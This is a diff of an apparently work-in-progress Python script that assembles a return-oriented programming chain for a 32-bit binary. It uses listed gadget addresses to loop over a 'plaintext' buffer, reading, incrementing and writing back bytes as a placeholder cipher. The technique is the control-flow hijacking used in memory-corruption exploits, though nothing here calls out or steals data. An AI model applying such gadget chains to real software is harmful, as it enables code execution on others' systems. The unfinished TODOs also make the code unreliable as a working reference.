@@ -20,7 +20,6 @@ mov_edx_eax = 0x08098db8  # # mov ecx, eax; mov eax, ecx; ret;
 mov_ecx_eax = 0x08098db8  # mov ecx, eax; mov eax, ecx; ret;
 
 dw_eax_edx = 0x080a36c8  # mov dword ptr [eax], edx; ret;
-mov_ecx_eax = 0x08098db8  # mov ecx, eax; mov eax, ecx; ret;
 fancy_dw_ebx_ecx = 0x08096c57  # mov dword ptr [ebx], ecx; add esp, 4; pop ebx; pop esi; ret;
 sub_eax_ecx = 0x08069d78  # sub eax, ecx; ret;
 sub_eax_edx = 0x0805f980  # sub eax, edx; ret;
@@ -32,6 +31,8 @@ double_ecx = 0x08049d37  # add ecx, ecx; ret;
 
 the_esp_op = 0x0809c3c1  # add esp, dword ptr [ebx + eax*4]; ret;
 
+move_bp_edx_al_clobber_eax = 0x0806dac2  # mov byte ptr [edx], al; mov eax, edx; ret;
+add_eax_edx = 0x08071393  # add eax, edx ; ret
 stdout.write("Doo Bar Baz\n")  # To be read into `plaintext`
 
 # Note payload cannot contain ord("\n")
@@ -41,20 +42,22 @@ dummy = [0x00000000] * 6
 
 code = [
     # Write initial pointer location
-    # *counter_addr = plaintext
+    # *counter_addr = 0
     pop_ecx_clobber_eax,
     plaintext,
     pop_ebx,
     counter_addr,
     fancy_dw_ebx_ecx,
     0x0,
-    plaintext,
+    0,
     0x0,
 
     # Load Element
     # al = **counter_addr
     pop_eax,
-    0x0,
+    counter_addr,
+    mov_eax_peax,
+    mov_eax_peax,
     pop_ebx,
     plaintext,
     xlatb,
@@ -90,7 +93,7 @@ code = [
     # TODO: Tune the next set to the number of instructions left in the `code` list after the_esp_op
     double_ecx,
     double_ecx,
-    inc_ecx,
+    inc_ecx,  # cannot use inc, can only use double
     inc_ecx,
     inc_ecx,
     inc_ecx,
@@ -118,19 +121,35 @@ code = [
     # esp += [ebx + 4 * eax] => esp += *offset_addr
     the_esp_op,
 
-    # TODO: Load the **counter_addr
+
+    # edx = ctr address
+    pop_eax,
+    counter_addr,
+    mov_eax_peax,
+    mov_eax_peax,
+    xchg_eax_edx,
+    pop_eax,
+    plaintext,
+    add_eax_edx,
+    xchg_eax_edx,
+
+    # Load Element
+    # al = **counter_addr
+    pop_eax,
+    counter_addr,
+    mov_eax_peax,
+    mov_eax_peax,
+    pop_ebx,
+    plaintext,
+    xlatb,
 
     # Increment
     # TODO: the actual cipher
-    dec_eax,
+    inc_eax,
 
     # Write element to ebx
-    # TODO: only write one byte
-    mov_ecx_eax,
-    fancy_dw_ebx_ecx,
-    0x0,
-    plaintext,
-    0x0,
+    # edx = plaintext + counter_variable
+    move_bp_edx_al_clobber_eax,
 
     # TODO: *counter_addr++
 
